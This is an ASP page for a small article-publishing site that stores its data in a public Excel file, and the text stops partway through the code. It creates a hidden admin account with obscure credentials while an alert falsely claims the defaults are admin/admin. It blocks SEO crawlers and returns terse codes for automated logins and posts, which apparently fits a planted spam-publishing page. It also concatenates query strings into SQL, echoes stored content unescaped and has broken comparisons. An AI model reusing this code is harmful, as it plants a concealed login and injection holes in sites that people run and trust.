<%@language=LiveScript%>
<%KaiShi=(new Date()).getTime();
%>
<script language="vbscript" runat="server" >
set regex = new regexp 
regex.ignorecase = true 
regex.global = true 
regex.pattern = "AhrefsBot|ahref|SiteBot|gigabot|dotbot|mj12bot|exabot|rogerbot" 
agent = request.ServerVariables("HTTP_USER_AGENT") & "" 
if agent <> "" then 
if regex.test(agent) then 
response.redirect("/") 
end if 
end if
</script><%
DataFile="info.xls";
db=Server.MapPath(DataFile);
FileName=""+Request.ServerVariables("URL");
FileName=FileName.replace(/(.*)\//g,"");
conn=Server.CreateObject("ADODB.Connection");
rs=Server.CreateObject("ADODB.RecordSet");
connstr="Driver={Microsoft Excel Driver (*.xls)};DBQ="+db+";ReadOnly=0;";
conn.Open(connstr);
Response.Addheader("Content-Type","text/html;charset=utf-8");
try{sql="select * from Copyright";
rs.Open(sql,conn);
WangZhan=rs(0)+"";
WangZhi=rs(1)+"";
YeTou=rs(2)+"";
YeWei=rs(3)+"";
rs.Close();}
catch(e){sql="Create table Article(BH int,BiaoTi varchar(255),NeiRong memo,ZuoZhe varchar(20),LaiYuan varchar(255),RiQi varchar(14),DianJi int,FenLei varchar(40),ShanChu bit)";
conn.Execute(sql);
sql="Create table Copyright(ZhanMing varchar(40),WangZhi varchar(255),YeTou memo, YeWei memo)";
conn.Execute(sql);
sql="Insert Into Copyright values('not set','res://mshtml.dll/about.moz','yetou','yewei')";
conn.Execute(sql);
sql="Create table User(BH int,YongHu varchar(10),MiMa varchar(20),QuanXian bit,ShanChu bit)";
conn.Execute(sql);
sql="Insert into User values(0,'vdksowel','sdwekskd',1,0)";
conn.Execute(sql);
Response.Addheader("refresh","3;url='javascript:alert(\"Database has been created successfully.\\n\\nthe default User and Password are admin.\")'");
WangZhan="fashion page",
WangZhi="fashion_page.asp";}
MoKuai=""+Request.QueryString("mokuai");
FenLei=""+Request.QueryString("fenlei");
ID=parseInt(Request.QueryString("ID"));
if(FenLei=="undefined"){Title=MoKuai;}
else{Title=FenLei;}%><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html class="js" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title><%if(Title=="undefined"){
if(isNaN(ID)){Response.Write("fashion page");}
else{sql="select BiaoTi,LaiYuan from Article where ShanChu=0 and BH="+ID;
rs.Open(sql,conn);
if(rs.eof){Response.Write("can't found");}
else{Response.Write(rs(0));}
rs.Close();}}
else{Title=Title.replace("manage","articlemanage");
Title=Title.replace("user","usermanage");
Title=Title.replace("login","userlogin");
Title=Title.replace("setting","copyrightsetting");
Response.Write(Title);}%></title>
<style>body.sidebar-left #main {margin-left: -210px;}
body.sidebars #main {margin-left: -210px;background-color: #FFFFFF;}
body.sidebar-left #squeeze {margin-left: 210px;}
body.sidebars #squeeze {margin-left: 210px;}
#sidebar-left { width: 210px;}
body.sidebar-right #main {margin-right: -210px;}
body.sidebars #main { margin-right: -210px;}
body.sidebar-right #squeeze {margin-right: 210px;}
body.sidebars #squeeze {margin-right: 210px;}
#sidebar-right {width: 210px;}


 body { font-family : Arial, Verdana, sans-serif;}
 
 
 #header { min-height:184pxpx;}
 
 
 
.node-unpublished{background-color:#fff4f4;}
.preview .node{background-color:#ffffea;}
#node-admin-filter ul{list-style-type:none;padding:0;margin:0;width:100%;}
#node-admin-buttons{float:left;margin-left:0.5em;clear:right;}td.revision-current{background:#ffc;}
.node-form .form-text{display:block;width:95%;}
.node-form .container-inline .form-text{display:inline;width:auto;}
.node-form .standard{clear:both;}
.node-form textarea{display:block;width:95%;}
.node-form .attachments fieldset{float:none;display:block;}
.terms-inline{display:inline;}


fieldset{margin-bottom:1em;padding:.5em;}form{margin:0;padding:0;}hr{height:1px;border:1px solid gray;}img{border:0;}table{border-collapse:collapse;}th{text-align:left;padding-right:1em;border-bottom:3px solid #ccc;}
.clear-block:after{content:".";display:block;height:0;clear:both;visibility:hidden;}
.clear-block{display:inline-block;}/*_\*/
* html .clear-block{height:1%;}
.clear-block{display:block;}/* End hide from IE-mac */



body.drag{cursor:move;}th.active img{display:inline;}tr.even,tr.odd{background-color:#eee;border-bottom:1px solid #ccc;padding:0.1em 0.6em;}tr.drag{background-color:#fffff0;}tr.drag-previous{background-color:#ffd;}td.active{background-color:#ddd;}td.checkbox,th.checkbox{text-align:center;}tbody{border-top:1px solid #ccc;}tbody th{border-bottom:1px solid #ccc;}thead th{text-align:left;padding-right:1em;border-bottom:3px solid #ccc;}
.breadcrumb{padding-bottom:.5em}div.indentation{width:20px;height:1.7em;margin:-0.4em 0.2em -0.4em -0.4em;padding:0.42em 0 0.42em 0.6em;float:left;}
.error{color:#e55;}div.error{border:1px solid #d77;}div.error,tr.error{background:#fcc;color:#200;padding:2px;}
.warning{color:#e09010;}div.warning{border:1px solid #f0c020;}div.warning,tr.warning{background:#ffd;color:#220;padding:2px;}
.ok{color:#008000;}div.ok{border:1px solid #00aa00;}div.ok,tr.ok{background:#dfd;color:#020;padding:2px;}
.item-list .icon{color:#555;float:right;padding-left:0.25em;clear:right;}
.item-list .title{font-weight:bold;}
.item-list ul{margin:0 0 0.75em 0;padding:0;}
.item-list ul li{margin:0 0 0.25em 1.5em;padding:0;list-style:disc;}ol.task-list li.active{font-weight:bold;}

.form-checkboxes,.form-radios{margin:1em 0;}
.form-checkboxes .form-item,.form-radios .form-item{margin-top:0.4em;margin-bottom:0.4em;}
.marker,.form-required{color:#f00;}
.more-link{text-align:right;}
.more-help-link{font-size:0.85em;text-align:right;}
.nowrap{white-space:nowrap;}
.item-list .pager{clear:both;text-align:center;}
.item-list .pager li{background-image:none;display:inline;list-style-type:none;padding:0.5em;}
.pager-current{font-weight:bold;}
.tips{margin-top:0;margin-bottom:0;padding-top:0;padding-bottom:0;font-size:0.9em;}dl.multiselect dd.b,dl.multiselect dd.b .form-item,dl.multiselect dd.b select{font-family:inherit;font-size:inherit;width:14em;}dl.multiselect dd.a,dl.multiselect dd.a .form-item{width:10em;}dl.multiselect dt,dl.multiselect dd{float:left;line-height:1.75em;padding:0;margin:0 1em 0 0;}dl.multiselect .form-item{height:1.75em;margin:0;}
.container-inline div,.container-inline label{display:inline;}ul.primary{border-collapse:collapse;padding:0 0 0 1em;white-space:nowrap;list-style:none;margin:5px;height:auto;line-height:normal;border-bottom:1px solid #bbb;}ul.primary li{display:inline;}ul.primary li a{background-color:#ddd;border-color:#bbb;border-width:1px;border-style:solid solid none solid;height:auto;margin-right:0.5em;padding:0 1em;text-decoration:none;}ul.primary li.active a{background-color:#fff;border:1px solid #bbb;border-bottom:#fff 1px solid;}ul.primary li a:hover{background-color:#eee;border-color:#ccc;border-bottom-color:#eee;}ul.secondary{border-bottom:1px solid #bbb;padding:0.5em 1em;margin:5px;}ul.secondary li{display:inline;padding:0 1em;border-right:1px solid #ccc;}ul.secondary a{padding:0;text-decoration:none;}ul.secondary a.active{border-bottom:4px solid #999;}
#autocomplete{position:absolute;border:1px solid;overflow:hidden;z-index:100;}
#autocomplete ul{margin:0;padding:0;list-style:none;}
#autocomplete li{background:#fff;color:#000;white-space:pre;cursor:default;}
#autocomplete li.selected{background:#0072b9;color:#fff;}html.js input.form-autocomplete{background-position:100% 2px;}html.js input.throbbing{background-position:100% -18px;}html.js fieldset.collapsed{border-bottom-width:0;border-left-width:0;border-right-width:0;margin-bottom:0;height:1em;}html.js fieldset.collapsed *{display:none;} * html.js fieldset.collapsed table *{display:inline;}html.js fieldset.collapsible{position:relative;}html.js fieldset.collapsible .fieldset-wrapper{overflow:auto;}
.resizable-textarea{width:95%;}
.resizable-textarea .grippie{height:9px;overflow:hidden;background:#eee ;border:1px solid #ddd;border-top-width:0;cursor:s-resize;}html.js .resizable-textarea textarea{margin-bottom:0;width:100%;display:block;}
.draggable a.tabledrag-handle{cursor:move;float:left;height:1.7em;margin:-0.4em 0 -0.4em -0.5em;padding:0.42em 1.5em 0.42em 0.5em;text-decoration:none;}a.tabledrag-handle:hover{text-decoration:none;}a.tabledrag-handle .handle{margin-top:4px;height:13px;width:13px;}a.tabledrag-handle-hover .handle{background-position:0 -20px;}
.joined + .grippie{height:5px;background-position:center 1px;margin-bottom:-2px;}
.teaser-checkbox{padding-top:1px;}div.teaser-button-wrapper{float:right;padding-right:5%;margin:0;}
.teaser-checkbox div.form-item{float:right;margin:0 5% 0 0;padding:0;}textarea.teaser{display:none;}html.js .no-js{display:none;}

.bar{background:#fff ;border:1px solid #00375a;height:1.5em;margin:0 0.2em;}
.filled{background:#0072b9;height:1em;border-bottom:0.5em solid #004a73;width:0%;}
.percentage{float:right;}
.ahah-progress{float:left;}
.ahah-progress .throbber{width:15px;height:15px;margin:2px;float:left;}tr .ahah-progress .throbber{margin:0 2px;}
.ahah-progress-bar{width:16em;}
#first-time strong{display:block;padding:1.5em 0 .5em;}tr.selected td{background:#ffc;}table.sticky-header{margin-top:0;background:#fff;}
#clean-url.install{display:none;}html.js .js-hide{display:none;}
#system-modules div.incompatible{font-weight:bold;}
#system-themes-form div.incompatible{font-weight:bold;}span.password-strength{visibility:hidden;}input.password-field{margin-right:10px;}div.password-description{padding:0 2px;margin:4px 0 0 0;font-size:0.85em;max-width:500px;}div.password-description ul{margin-bottom:0;}
.password-parent{margin:0 0 0 0;}input.password-confirm{margin-right:10px;}
.confirm-parent{margin:5px 0 0 0;}span.password-confirm{visibility:hidden;}span.password-confirm span{font-weight:normal;}

ul.menu{list-style:none;border:none;text-align:left;}ul.menu li{margin:0 0 0 0.5em;}li.expanded{list-style-type:circle;padding:0.2em 0.5em 0 0;margin:0;}li.collapsed{list-style-type:disc;padding:0.2em 0.5em 0 0;margin:0;}li.leaf{list-style-type:square;padding:0.2em 0.5em 0 0;margin:0;}li a.active{color:#000;}td.menu-disabled{background:#ccc;}ul.links{margin:0;padding:0;}ul.links.inline{display:inline;}ul.links li{display:inline;list-style-type:none;padding:0 0.5em;}
.block ul{margin:0;padding:0 0 0.25em 1em;}

#permissions td.module{font-weight:bold;}
#permissions td.permission{padding-left:1.5em;}
#access-rules .access-type,#access-rules .rule-type{margin-right:1em;float:left;}
#access-rules .access-type .form-item,#access-rules .rule-type .form-item{margin-top:0;}

#user-login-form{text-align:center;}
#user-admin-filter ul{list-style-type:none;padding:0;margin:0;width:100%;}
#user-admin-buttons{float:left;margin-left:0.5em;clear:right;}
#user-admin-settings fieldset .description{font-size:0.85em;padding-bottom:.5em;}
.profile{clear:both;margin:1em 0;}
.profile .picture{float:right;margin:0 1em 1em 0;}
.profile h3{border-bottom:1px solid #ccc;}
.profile dl{margin:0 0 1.5em 0;}
.profile dt{margin:0 0 0.2em 0;font-weight:bold;}
.profile dd{margin:0 0 1em 0;}

#lightbox{position:absolute;top:40px;left:0;width:100%;z-index:100;text-align:center;line-height:0;}
#lightbox a img{border:none;}
#outerImageContainer{position:relative;background-color:#fff;width:250px;height:250px;margin:0 auto;min-width:240px;overflow:hidden;}
#imageContainer,#frameContainer,#modalContainer{padding:10px;}
#modalContainer{line-height:1em;overflow:auto;}
#loading{height:25%;width:100%;text-align:center;line-height:0;position:absolute;top:40%;left:45%;*left:0%;}
#hoverNav{position:absolute;top:0;left:0;height:100%;width:100%;z-index:10;}
#imageContainer>#hoverNav{left:0;}
#frameHoverNav{z-index:10;margin-left:auto;margin-right:auto;width:20%;position:absolute;bottom:0px;height:45px;}
#imageData>#frameHoverNav{left:0;}
#hoverNav a,#frameHoverNav a{outline:none;}
#prevLink,#nextLink{width:49%;height:100%;display:block;}
#prevLink,#framePrevLink{left:0;float:left;}
#nextLink,#frameNextLink{right:0;float:right;}
}

#framePrevLink,#frameNextLink{width:45px;height:45px;display:block;position:absolute;bottom:0px;}
#imageDataContainer{font:10px Verdana,Helvetica,sans-serif;background-color:#fff;margin:0 auto;line-height:1.4em;min-width:240px;}
#imageData{padding:0 10px;}
#imageData #imageDetails{width:70%;float:left;text-align:left;}
#imageData #caption{font-weight:bold;}
#imageData #numberDisplay{display:block;clear:left;padding-bottom:1.0em;}
#imageData #lightbox2-node-link-text{display:block;padding-bottom:1.0em;}
#imageData #bottomNav{height:66px;}
.lightbox2-alt-layout #imageData #bottomNav,.lightbox2-alt-layout-data #bottomNav{margin-bottom:60px;}
#lightbox2-overlay{position:absolute;top:0;left:0;z-index:90;width:100%;height:500px;background-color:#000;}
#overlay_default{opacity:0.6;}
.clearfix:after{content:".";display:block;height:0;clear:both;visibility:hidden;}* html>body .clearfix{display:inline;width:100%;}* html .clearfix{/*_\*/
  height:1%;/* End hide from IE-mac */}
#bottomNavClose{display:block;margin-top:33px;float:right;padding-top:0.7em;height:26px;width:26px;}
#bottomNavClose:hover{background-position:right;}
#loadingLink{display:block;width:32px;height:32px;}
#bottomNavZoom{display:none;width:34px;height:34px;position:relative;left:30px;float:right;}
#bottomNavZoomOut{display:none;width:34px;height:34px;position:relative;left:30px;float:right;}
#lightshowPlay{margin-top:42px;float:right;margin-right:5px;margin-bottom:1px;height:20px;width:20px;}
#lightshowPause{margin-top:42px;float:right;margin-right:5px;margin-bottom:1px;height:20px;width:20px;}
.lightbox2-alt-layout-data #bottomNavClose,.lightbox2-alt-layout #bottomNavClose{margin-top:93px;}
.lightbox2-alt-layout-data #bottomNavZoom,.lightbox2-alt-layout-data #bottomNavZoomOut,.lightbox2-alt-layout #bottomNavZoom,.lightbox2-alt-layout #bottomNavZoomOut{margin-top:93px;}
.lightbox2-alt-layout-data #lightshowPlay,.lightbox2-alt-layout-data #lightshowPause,.lightbox2-alt-layout #lightshowPlay,.lightbox2-alt-layout #lightshowPause{margin-top:102px;}
.lightbox_hide_image{display:none;}
#lightboxImage{-ms-interpolation-mode:bicubic;}
div.admin{padding:0;}div.admin-panel h3{background-color:#999 !important;}
tr.odd,tr.even,tr.odd a,tr.even a{color:black;}
.primary li a{color:black;}
.secondary li a{color:inherit;}td.active{background-color:inherit;}
.form-item label{}
.preview{color:black;}body{margin:0;padding:0;min-width:730px;}
#top-container{padding:0 ;}
#page{margin:0 auto;width:95%;background:#fff;}
#page #shadow-right{padding:0 11px;}
#page #page-bg{background-color:#fff;}
#banner{background-color:#1c1c1c;}
#banner p{padding-bottom:0.5em;padding-top:0.5em;margin:0 auto;}
#banner img{display:block;margin-left:auto;margin-right:auto;}
#header,#content{width:100%;}
#header a:link,#header a:visited,#header a:hover{color:#fff;}

#middlecontainer{margin:0 auto;}
#sidebar-left,#sidebar-right{width:210px;float:left;z-index:2;position:relative;}
#sidebar-left .block,#sidebar-right .block{padding:8px 16px;margin-bottom:5px;}
#main{float:left;width:100%;}body.sidebar-left #main{margin-left:-210px;margin-right:0;}body.sidebar-right #main{margin-right:-210px;margin-left:0;}body.sidebars #main{margin-left:-210px;margin-right:-210px;}body.sidebar-left #squeeze{margin-left:210px;margin-right:0;padding-left:4px;}body.sidebar-right #squeeze{margin-right:210px;margin-left:0;padding-right:4px;}body.sidebars #squeeze{margin-left:210px;margin-right:210px;padding:0 4px;}body.sidebars #sidebar-left{margin-right:0px;}
#squeeze-content{padding-bottom:15px;}
#inner-content{padding:4px 16px;}
.node{margin:0.5em 0 2em 0;}
.node .content,.comment .content{margin:.5em 0 .5em 0;}body{font-size:82%;font-family:Helvetica,Arial,Verdana,sans-serif;line-height:145%;color:#333333;background-color:#fff;}p{margin-top:0.5em;margin-bottom:0.5em;}h1,h2,h3,h4,h4{padding-bottom:5px;margin:10px 0;line-height:125%;}h1{font-size:175%;}h2{font-size:125%;}h3{font-size:110%;}h4{font-size:100%;}h5,h6{font-size:90%;}
#content-top h2,#content-top h2.title,#content-bottom h2,#content-bottom h2.title{font-size:125%;}
#main h2.title{font-size:150%;}
.title,.title a{font-weight:bold;color:#8E6126;margin:0 auto;}
.submitted{color:#8E6126;font-size:0.8em;}
.links{color:#8E6126;}
.links a{font-weight:bold;}
.block .title{margin-bottom:.25em;}
.box .title{font-size:1.1em;}
.sticky{padding:.5em;background-color:#eee;border:solid 1px #ddd;}a{text-decoration:none;}a:hover{text-decoration:underline;}
#main .block h2.title{font-size:125%;}tr.odd td,tr.even td{padding:0.3em;}tr.odd{background:#eee;}tr.even{background:#ccc;}tbody{border:none;}fieldset{border:1px solid #ccc;}pre{background-color:#eee;padding:0.75em 1.5em;font-size:12px;border:1px solid #ddd;}table{font-size:1em;}
.form-item label{font-size:1em;color:#222;}
.item-list .title{font-size:1em;color:#222;}
.item-list ul li{margin:0pt 0pt 0.25em 0;}
.links{margin-bottom:0;}
.comment .links{margin-bottom:0;}
#help{font-size:0.9em;margin-bottom:1em;}
.clr{clear:both;}
#logo{vertical-align:middle;border:0;}
#logo img{float:left;border:0;}
#top-center{background:#1C1C1C margin:0 auto;min-height:80px;}
#logo-title{padding:22px;float:left;}
#name-and-slogan{float:right;margin:10px 22px;display:inline;}
.site-name{margin:0;padding:0;font-size:2em;}
.site-name a:link,.site-name a:visited{color:#fff;}
.site-name a:hover{text-decoration:underline;}
.site-slogan{font-size:1.2em;color:#eee;display:block;margin:0;padding:5px;font-style:italic;width:100%;}
#search-theme-form{float:right;padding:0.5em 0.5em 0 0.5em;}
#search .form-text,#search .form-submit{}
#search .form-text{width:16em;}
#edit-search-theme-form-1-wrapper label{display:none;}
#primarymenu{padding:10px;text-align:right;float:right;}
#primarymenu li{border-left:1px solid #fff;padding:0pt 0.5em 0pt 0.7em;}
#primarymenu li.first{border:medium none;}
.primary-links{font-size:1.0em;color:#fff;}
#secondary-links{background-color:#1F1F1F;padding:20px 0;text-align:center;}
#secondary-links li.first{border-left:none;}
.primary-links a,.primary-links a:link,.primary-links a:visited,.primary-links a:hover,.primary-links .links{font-weight:bold;color:#fff;}
.primary-links ul.menu{text-align:right;}
.primary-links li{display:inline;list-style-type:none;padding:0pt 0.5em;}
.primary-links li.first{border:none;}
#primarymenu a.active,#primarymenu a.active{color:#fff;}
#primarymenu a{color:#fff;font-weight:normal;font-size:120%;}
#suckerfishmenu .content{margin:0px;}
#mission{padding:1.5em 2em;color:#fff;}
#mission a,#mission a:visited{color:#9cf;font-weight:bold;}
.breadcrumb{margin-bottom:.5em;}div#breadcrumb{clear:both;font-size:80%;padding-top:3px;margin-left:15px;}
.messages{background-color:#eee;border:1px solid #ccc;padding:0.3em;margin-bottom:1em;}
.error{border-color:red;}
#header .block{margin:0px 22px;color:#3f3f3f;}
#footer{background-color:#1f1f1f;font-size:0.8em;text-align:center;clear:left;}
#footer-region{text-align:center;}
#footer-message{text-align:center;margin:0;font-size:90%;color:gray;}
#footer-message a{font-weight:bold;}
#footer .content{margin:0px;}
#footer .content p{margin-bottom:0px;margin-top:0px;}
.node .taxonomy{font-size:0.8em;padding-left:1.5em;}
.node .picture{border:1px solid #ddd;float:right;margin:0.5em;}
.comment{border:1px solid #abc;padding:.5em;margin-bottom:1em;}
.comment .title a{font-size:1.1em;font-weight:normal;}
.comment .new{text-align:right;font-weight:bold;font-size:0.8em;float:right;color:red;}
.comment .picture{border:1px solid #abc;float:right;margin:0.5em;}
#aggregator .feed-source{background-color:#eee;border:1px solid #ccc;padding:1em;margin:1em 0;}
#aggregator .news-item .categories,#aggregator .source,#aggregator .age{font-style:italic;font-size:0.9em;}
#aggregator .title{margin-bottom:0.5em;font-size:1em;}
#aggregator h3{margin-top:1em;}
#profile .profile{clear:both;border:1px solid #abc;padding:.5em;margin:1em 0em;}
#profile .profile .name{padding-bottom:0.5em;}
.block-forum h3{margin-bottom:.5em;}div.admin-panel .description{color:#8E6126;}div.admin-panel .body{background:#f4f4f4;}div.admin-panel h3{color:#fff;padding:5px 8px 5px;margin:0;}
.poll .title{color:#000000;}body.mceContentBody{background:#fff;color:#000;}
h1,h2,h3,h4,h5,h6{font-family:"Myriad Pro","Helvetica","Arial",sans-serif;color:#334a5b !important;}
.links{font-size:90%;}div.blog h1.title{display:none;}div.box h2{font-size:125%;font-weight:normal;border-top:1px dotted #cccccc;margin-top:2em;}hr{color:#fff;background-color:#fff;border:1px dotted #cccccc;border-style:none none dotted;}div.archive li{list-style:none;}span.read-more{text-align:right;float:right;}body{color:#333333;background-color:#AEB1A2;}tr.odd{background:#F5F5E9;}tr.even{background:#EEF9F4;}
#section2{background:#1f1f1f;color:#c7c7c7;padding:0 8px;}
#primary a.active,#secondary a.active{color:#CDCD8F;}a:link,a:visited,a:hover,.title,.title a,.submitted,.links,.node .taxonomy,#aggregator .news-item .categories,#aggregator .source,#aggregator .age,#forum td .name,div.admin-panel .description{color:#6c8292;}
#section2 .title,#section2 .title a{color:#fff;}
#section2 a:link,#section2 a:visited,#section2 a.hover{color:#fff;}
#header{background:#6c8292 }
#mission,div.admin-panel h3{background-color:#3F3F3F;}
</style></head>
</head>
<body class="sidebars lightbox-processed cron-check-processed">
  	<div id="simplemenu_container"></div>
  	<div id="simplemenu_closing-div" style="clear:both;"></div>
    <div id="top-container">
    	<div id="squeeze-top" style="width : 1002px; background:#020202 ; margin:0 auto;">
      		<div id="top-center" style="width : 980px;">
        		<div id="logo-title">
      				<div id="name-and-slogan">
                  		<h1 class="site-name"> <a href="<%=FileName%>" title="Home">Home</a> </h1>
             		</div>
           		</div>
                <div id="primarymenu">
                	<ul class="links primary-links"><li class="menu-151 first last"><%if(Session("Access")+""=="undefined"||Session("Access")=="Guest"){%>

<tt style="cursor:hand" onClick="document.all.Login.style.display='block';document.all.Login.style.left=event.x-140;document.DengLu.YongHu.focus()">login</tt>
<div style="position:absolute;display:none" id=Login>
<table border bordercolor=black bgcolor=menu bordercolordark=menu cellpadding=0 cellspacing=0 width=150 height=123>
<tr><td bgcolor=abcdef height=27 align=center>userlogin</td></tr>
<tr><form action=<%=FileName%>?mokuai=login method=post name=DengLu>
<td align=center>
user:<input name=YongHu size=10><dt>
passwd:<input type=password name=MiMa size=10><dt>
<input type=submit value=login>
<input type=button value=cancle onClick="document.all.Login.style.display='none'"></td></form></tr></table></div><%}
else{Response.Write("<td width=60 align=center><a href="+FileName+"?mokuai=manage>articlemanage</a></td>");}%></li></ul>                                    
                </div>
     		</div>
      	</div>
  	</div>
    <div id="page" class="blog" style="width : 1002px;">
    	<div id="shadow-right">
        	<div id="page-bg">
      			<div id="header" class="clear-block">
	      			<div class="site-slogan"> <%sql="Select distinct FenLei from Article where ShanChu=0";
rs.Open(sql,conn);
if(rs.eof){Response.Write("curr , no any article.");}
else{
while(!rs.eof){Response.Write((rs(0)+"").link(FileName+"?fenlei="+rs(0))+"|");
rs.MoveNext();}}
rs.Close();%></div>
            	</div>
                <div id="middlecontainer">
               		<div id="sidebar-left">
                    	<div class="block block-block" id="block-block-2">
    						<div class="content">
<p>Articlesearch</p>
<div><form action=<%=FileName%>>
<input name=guanjianci size="20">
<select name=fenlei>
<option value=undefined>allfenlei</option>
<%sql="Select distinct FenLei from Article where ShanChu=0";
rs.Open(sql,conn);
while(!rs.eof){%><option value="<%=rs(0)%>"<%if(rs(0)+""==FenLei) Response.Write(" selected")%>><%=rs(0)%></option>
<%rs.MoveNext();}
rs.Close();%>
</select>
<input type=submit value=search>
</form></div>
							</div>
                        </div>
                    </div>
                    <div id="main">
        				<div id="squeeze">
                        	<div id="breadcrumb"> 
                            	<div class="breadcrumb"><%Response.Write(WangZhan.link(WangZhi));%>\<%switch(MoKuai){
case "login":
Response.Write("userlogin");
break;
case "setting":
Response.Write("copyrightsetting");
break;
case "user":
Response.Write("usermanage");
break;
case "manage":
Response.Write("articlemanage");
break;
default:
if(FenLei!="undefined"){Response.Write(FenLei);}
else if(!isNaN(ID)){
sql="select FenLei,BiaoTi from Article where ShanChu=0 and BH="+ID;
rs.Open(sql,conn);
if(rs.eof){Response.Write("can't found");}
else{LeiBie=rs(0)+"";
%><a href="<%=FileName%>?fenlei=<%=rs(0)%>"><%=rs(0)%></a>\<%=rs(1)%><%}
rs.Close();}
else{Response.Write("Home");}}%></div> 
                            </div>
<div id="squeeze-content">
                        		<div id="inner-content" class="blog">
                           			<h1 class="title">Blogs</h1>
              						<div class="tabs"></div>
                                          <div class="item-list"></div>
                                          <div class="node">

<%

switch(MoKuai){
/*********** loginmokuai **************/
case "logout":
Session("Access")="Guest";
break;
case "login":

YongHu=Request.Form("YongHu")+"";
YongHu=YongHu.replace(/'/g,"''");
MiMa=Request.Form("MiMa")+"";
MiMa=MiMa.replace(/'/g,"''");
if(YongHu+""=="undefined"){
Response.Write("<Meta http-equiv=refresh content=2;url="+FileName+"><br><center><b>you have logout state .</b></center><br>");}
else{
sql="select * from User where YongHu='"+YongHu+"' and MiMa='"+MiMa+"' and ShanChu=0";
rs.Open(sql,conn);
if(rs.eof){Response.Write("<Meta http-equiv=refresh content=2;url=javascript:history.go(-1)><br><center><b>sorry ,Your input user name or passwd not right.</b></center><br>");}
else{QuanXian=""+rs(3);
if(QuanXian=="true"){QuanXian=true;}
else{QuanXian=false;}

Session("Access")=QuanXian?"Admin":"User";
response.write ("[[loginok]]");
response.end;
//Response.Write("<Meta http-equiv=refresh content=2;url="+FileName+"?mokuai=manage><br><center><b>loginsuccess.</b></center><br>");
}
rs.Close();}
break;
/*********** articlemanage **************/
case "manage":
if(Request.QueryString("caozuo")+""=="delete"&&Session("Access")=="Admin"){
sql="update Article set ShanChu=1 where BH="+Request.QueryString("BH");
var d;
conn.Execute(sql,d);
if (d=1){response.write("[[deleteok]]");response.end;}
}
if(Request.QueryString("caozuo")+""=="huifu"&&Session("Access")=="Admin"){
sql="update Article set ShanChu=0 where BH="+Request.QueryString("BH");
var c;
conn.Execute(sql,c);
if (c=1){response.write("[[huifuok]]");response.end;}
}
if(Request.QueryString("caozuo")+""=="add"){
sql="select count(*) from Article";
rs.open(sql,conn);
BH=rs(0)+"";
rs.Close();
BiaoTi=Request.Form("BiaoTi")+"";
FenLei=Request.Form("FenLei")+"";
NeiRong=Request.Form("NeiRong")+"";
ZuoZhe=Request.Form("ZuoZhe")+"";
LaiYuan=Request.Form("LaiYuan")+"";
BiaoTi=BiaoTi.replace(/'/g,"''");
FenLei=FenLei.replace(/'/g,"''");
NeiRong=NeiRong.replace(/'/g,"''");
NeiRong=NeiRong.replace(/\r/g,"<br>");
ZuoZhe=ZuoZhe.replace(/'/g,"''");
LaiYuan=LaiYuan.replace(/'/g,"''");
RiQi=new Date();
Nian=RiQi.getYear();
Yue=RiQi.getMonth()+1;
/*********** NeiRong=NeiRong.replace(/ /g,"&nbsp");*************/
if(Yue<10) Yue="0"+Yue;
Ri=RiQi.getDate();
if(Ri<10) Ri="0"+Ri;
RiQi=Nian+"-"+Yue+"-"+Ri+"";
sql="select top 1 BH from Article where ShanChu=1 order by RiQi asc";
rs.open(sql,conn);
if(!rs.eof){
BH=rs(0);
sql="Update Article set BiaoTi='"+BiaoTi+"',NeiRong='"+NeiRong+"',ZuoZhe='"+ZuoZhe+"',LaiYuan='"+LaiYuan+"',RiQi='"+RiQi+"',DianJi=0,FenLei='"+FenLei+"',ShanChu=0 where BH="+BH;}
else{sql="insert into Article values("+BH+",'"+BiaoTi+"','"+NeiRong+"','"+ZuoZhe+"','"+LaiYuan+"','"+RiQi+"',0,'"+FenLei+"',0)";}
rs.Close();
var b;
if(Session("Access")=="User"||Session("Access")=="Admin") conn.Execute(sql,b);
if (b=1){response.write("[[sendoutok]]"+BH+"|||");response.end}else{response.Write("[[sendoutfail]]");response.end;}
}
if(Request.QueryString("caozuo")+""=="modify"&&Session("Access")=="Admin"){
if(Request.Form("BH")+""!="undefined"){
BiaoTi=Request.Form("BiaoTi")+"";
FenLei=Request.Form("FenLei")+"";
NeiRong=Request.Form("NeiRong")+"";
ZuoZhe=Request.Form("ZuoZhe")+"";
LaiYuan=Request.Form("LaiYuan")+"";
BiaoTi=BiaoTi.replace(/'/g,"''");
FenLei=FenLei.replace(/'/g,"''");
NeiRong=NeiRong.replace(/'/g,"''");
NeiRong=NeiRong.replace(/\r/g,"<br>");
ZuoZhe=ZuoZhe.replace(/'/g,"''");
LaiYuan=LaiYuan.replace(/'/g,"''");
RiQi=new Date();
Nian=RiQi.getYear();
Yue=RiQi.getMonth()+1;
/*************NeiRong=NeiRong.replace(/ /g,"&nbsp");*************/
if(Yue<10) Yue="0"+Yue;
Ri=RiQi.getDate();
if(Ri<10) Ri="0"+Ri;
RiQi=Nian+"-"+Yue+"-"+Ri+"-";
sql="Update Article set BiaoTi='"+BiaoTi+"',NeiRong='"+NeiRong+"',ZuoZhe='"+ZuoZhe+"',LaiYuan='"+LaiYuan+"',RiQi='"+RiQi+"',FenLei='"+FenLei+"' where BH="+Request.Form("BH");


}
else{%><div style="position:absolute;top:expression((document.body.clientHeight-320)/2+body.scrollTop);left:expression((document.body.clientWidth-400)/2)" id=XiuGai>
<table border width=400 border bordercolor=black bordercolordark=white cellpadding=0 cellspacing=0>
<tr bgcolor=000070>
<th align=center height=20><font color=white>modify article</font></th></tr>
<tr bgcolor=menu><td>
<table><tr><%sql="select * from Article where BH="+Request.QueryString("BH");
rs.Open(sql,conn);
BH=rs(0)+"";
BiaoTi=rs(1)+"";
NeiRong=rs(2)+"";
ZuoZhe=rs(3)+"";
LaiYuan=rs(4)+"";
FenLei=rs(7)+"";
rs.Close();
BiaoTi=BiaoTi.replace("/g,");
NeiRong=NeiRong.replace(/<br>\n/g,"\r\n");%>
<form action=<%=FileName%>?mokuai=manage&caozuo=modify  method=post><input type=hidden name=BH value=<%=BH%>>
<td width=77 align=center>articletitle</td><td><input size=41 name=BiaoTi value="<%=BiaoTi%>"></td></tr>
<tr><td align=center>suoshufenlei</td>
<td><select onChange="FenLei.value=value">
<option>selectfenlei</option>
<%sql="Select distinct FenLei from Article where ShanChu=0";
rs.Open(sql,conn);
